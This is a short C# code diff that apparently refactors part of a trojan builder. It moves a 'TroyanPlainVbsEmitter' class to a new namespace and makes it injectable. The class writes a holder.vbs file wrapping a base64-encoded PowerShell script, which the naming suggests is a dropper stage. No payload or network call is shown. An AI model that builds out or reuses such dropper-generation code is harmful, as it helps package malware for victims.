@@ -1,11 +1,11 @@
 using Commons;
 
-namespace TroyanBuilder;
+namespace Troyan.Core;
 
 /// <summary>Writes holder.vbs with standard base64 of plain holder.debug.ps1 (no randomer pass).</summary>
-internal static class TroyanPlainVbsEmitter
+public sealed class TroyanPlainVbsEmitter : ITroyanPlainVbsEmitter
 {
-    public static void Write(ServerLayoutPaths layout)
+    public void Write(ServerLayoutPaths layout)
     {
         var templatePath = Path.Combine(layout.TroyanVbsDir, "holder.vbs");
         if (!File.Exists(templatePath))
